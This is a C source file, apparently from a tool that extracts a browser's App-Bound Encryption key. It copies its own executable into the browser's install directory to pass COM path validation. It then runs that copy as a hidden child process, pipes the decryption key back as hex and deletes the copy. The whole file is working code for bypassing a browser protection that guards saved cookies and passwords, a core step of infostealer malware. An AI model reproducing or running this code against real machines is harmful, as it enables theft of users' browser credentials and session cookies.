#include "AbeDecrypt.h"

/*** method: Drop (copy self into the browser dir so COM path validation passes) ***/

#define ABE_DROP_PIPE_BUFFER_SIZE 4096

/* Drop child: runs from the browser directory, writes the key to the stdout pipe */
_Success_(return != FALSE)
BOOL
AbeDropChild(
    _In_ const NET_BROWSER_INFO* Browser)
{
    CHAR Line[ABE_KEY_SIZE * 2 + 16];
    HANDLE StdOut;
    HRESULT RoHr;
    ULONG Length;

    RtlZeroMemory((PVOID)g_Key, ABE_KEY_SIZE);
    g_Pending = 0;
    g_Code = (LONG)E_FAIL;
    RoHr = RoInitialize(RO_INIT_SINGLETHREADED);
    if (FAILED(RoHr))
    {
        /* reading Local State uses WinRT JSON */
        return FALSE;
    }
    if (AbePrepareRequest(Browser))
    {
        AbePayloadWorker();
    }
    RoUninitialize();
    if (g_Code != 0)
    {
        return FALSE;
    }

    Length = Str_PrintfExA(Line, sizeof(Line), "KEY=");
    AbeFormatKeyHex((const BYTE*)g_Key, Line + Length);
    Length += ABE_KEY_SIZE * 2;
    Str_PrintfExA(Line + Length, sizeof(Line) - Length, "\n");
    StdOut = IO_ConGetStdOutput();
    return StdOut != NULL &&
           NT_SUCCESS(IO_WriteFile(StdOut, NULL, Line, (ULONG)Str_SizeA(Line), NULL));
}

_Success_(return != FALSE)
BOOL
AbeGetKeyDrop(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    static UNICODE_STRING NamedPipeDir = RTL_CONSTANT_STRING(DEVICE_NAMED_PIPE);
    WCHAR Self[MAX_PATH], Copy[MAX_PATH], Cmd[MAX_PATH * 2], Dir[MAX_PATH];
    STARTUPINFOW Si;
    PROCESS_INFORMATION Pi;
    OBJECT_HANDLE_FLAG_INFORMATION HandleInfo;
    HANDLE PipeDir = NULL;
    HANDLE ReadPipe = NULL, WritePipe = NULL;
    static CHAR Buffer[4096];
    CHAR* Line;
    DWORD Read, Total = 0;
    DWORD ExitCode = MAXDWORD;
    NTSTATUS Status;
    W32ERROR Error;
    HRESULT Hr;
    ULONGLONG Step;
    BOOL Ok, Copied;
    ULONG i, Length;

    /* the child copy runs with the same executable name as ours */
    Step = AbeStepStart();
    Ok = NT_CopyStringW(&NtCurrentPeb()->ProcessParameters->ImagePathName, Self, MAX_PATH);
    AbeLogStepHr(L"Drop", L"get self path", Ok ? S_OK : HRESULT_FROM_WIN32(ERROR_BAD_PATHNAME), Step);
    if (!Ok)
    {
        return FALSE;
    }
    Length = (ULONG)(wcsrchr(Browser->ExePath, L'\\') - Browser->ExePath);
    RtlCopyMemory(Dir, Browser->ExePath, Length * sizeof(WCHAR));
    Dir[Length] = UNICODE_NULL;
    Str_PrintfExW(Copy, MAX_PATH, L"%ls\\%ls", Dir, wcsrchr(Self, L'\\') + 1);
    Copied = !Str_EqualIW(Self, Copy);
    Step = AbeStepStart();
    if (Copied)
    {
        Ok = CopyFileW(Self, Copy, FALSE);
        Error = Ok ? ERROR_SUCCESS : Err_GetLastError();
    } else
    {
        Ok = TRUE;
        Error = ERROR_SUCCESS;
    }
    AbeLogStepWin32(L"Drop", Copied ? L"copy into browser directory" : L"use browser directory copy", Error, Step);
    if (!Ok)
    {
        return FALSE;
    }

    Step = AbeStepStart();
    Status = IO_CreateFile(&PipeDir,
                           &NamedPipeDir,
                           NULL,
                           SYNCHRONIZE | GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           FILE_OPEN,
                           FILE_SYNCHRONOUS_IO_NONALERT);
    AbeLogStepNt(L"Drop", L"open named-pipe directory", Status, Step);
    if (NT_SUCCESS(Status))
    {
        Step = AbeStepStart();
        Status = IO_CreatePipe(PipeDir,
                               &ReadPipe,
                               &WritePipe,
                               FILE_PIPE_INBOUND,
                               ABE_DROP_PIPE_BUFFER_SIZE);
        AbeLogStepNt(L"Drop", L"create stdout pipe", Status, Step);
        NtClose(PipeDir);
    }
    if (!NT_SUCCESS(Status))
    {
        if (Copied)
        {
            IO_DeleteWin32File(Copy, NULL);
        }
        return FALSE;
    }
    HandleInfo.Inherit = TRUE;
    HandleInfo.ProtectFromClose = FALSE;
    Step = AbeStepStart();
    Status = NtSetInformationObject(WritePipe,
                                    ObjectHandleFlagInformation,
                                    &HandleInfo,
                                    sizeof(HandleInfo));
    AbeLogStepNt(L"Drop", L"make stdout pipe inheritable", Status, Step);
    if (!NT_SUCCESS(Status))
    {
        NtClose(ReadPipe);
        NtClose(WritePipe);
        if (Copied)
        {
            IO_DeleteWin32File(Copy, NULL);
        }
        return FALSE;
    }

    RtlZeroMemory(&Si, sizeof(Si));
    Si.cb = sizeof(Si);
    Si.dwFlags = STARTF_USESTDHANDLES;
    Si.hStdInput = NULL;
    Si.hStdOutput = WritePipe;
    Si.hStdError = WritePipe;
    Str_PrintfExW(Cmd, MAX_PATH * 2, L"\"%ls\" Drop", Copy);
    Step = AbeStepStart();
    Ok = CreateProcessInternalW(NULL,
                                NULL,
                                Cmd,
                                NULL,
                                NULL,
                                TRUE,
                                CREATE_NO_WINDOW,
                                NULL,
                                NULL,
                                &Si,
                                &Pi,
                                NULL);
    Error = Ok ? ERROR_SUCCESS : Err_GetLastError();
    AbeLogStepWin32(L"Drop", L"create child process", Error, Step);
    if (!Ok)
    {
        NtClose(ReadPipe);
        NtClose(WritePipe);
        if (Copied)
        {
            IO_DeleteWin32File(Copy, NULL);
        }
        return FALSE;
    }
    NtClose(WritePipe);
    Step = AbeStepStart();
    Status = NtWaitForSingleObject(Pi.hProcess, FALSE, NULL);
    AbeLogStepNt(L"Drop", L"wait child process", Status, Step);
    Step = AbeStepStart();
    Ok = GetExitCodeProcess(Pi.hProcess, &ExitCode);
    Error = Ok ? ERROR_SUCCESS : Err_GetLastError();
    if (Ok)
    {
        AbeLog(L"Drop: query child exit code: OK, code=%lu (%I64ums)\r\n", ExitCode, AbeStepMs(Step));
    } else
    {
        AbeLogStepWin32(L"Drop", L"query child exit code", Error, Step);
    }

    Step = AbeStepStart();
    Status = STATUS_SUCCESS;
    while (Total < sizeof(Buffer) - 1)
    {
        Status = IO_ReadFile(ReadPipe,
                             NULL,
                             Buffer + Total,
                             (DWORD)(sizeof(Buffer) - 1 - Total),
                             &Read);
        if (!NT_SUCCESS(Status) || Read == 0)
        {
            break;
        }
        Total += Read;
    }
    Buffer[Total] = ANSI_NULL;
    AbeLog(L"Drop: read child output: %ls, status=0x%08lX, bytes=%lu (%I64ums)\r\n",
           NT_SUCCESS(Status) || Status == STATUS_PIPE_BROKEN ? L"OK" : L"failed",
           (ULONG)Status,
           Total,
           AbeStepMs(Step));
    NtClose(ReadPipe);
    NtClose(Pi.hThread);
    NtClose(Pi.hProcess);
    if (Copied)
    {
        IO_DeleteWin32File(Copy, NULL);
    }

    /* locate "KEY=" byte-wise: the stream may embed NUL terminators */
    Step = AbeStepStart();
    for (i = 0; i + 4 + ABE_KEY_SIZE * 2 <= Total; i++)
    {
        if (Buffer[i] == 'K' && Buffer[i + 1] == 'E' &&
            Buffer[i + 2] == 'Y' && Buffer[i + 3] == '=')
        {
            break;
        }
    }
    if (i + 4 + ABE_KEY_SIZE * 2 > Total)
    {
        Hr = HRESULT_FROM_WIN32(ERROR_NOT_FOUND);
        AbeLogStepHr(L"Drop", L"parse child key", Hr, Step);
        return FALSE;
    }
    Line = Buffer + i + 4;
    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        INT Hi = Line[i * 2] <= '9' ? Line[i * 2] - '0' : Line[i * 2] - 'A' + 10;
        INT Lo = Line[i * 2 + 1] <= '9' ? Line[i * 2 + 1] - '0' : Line[i * 2 + 1] - 'A' + 10;

        if (Hi < 0 || Hi > 15 || Lo < 0 || Lo > 15)
        {
            AbeLogStepHr(L"Drop", L"parse child key", HRESULT_FROM_WIN32(ERROR_INVALID_DATA), Step);
            return FALSE;
        }
        Key[i] = (BYTE)((Hi << 4) | Lo);
    }
    AbeLogStepHr(L"Drop", L"parse child key", S_OK, Step);
    return TRUE;
}
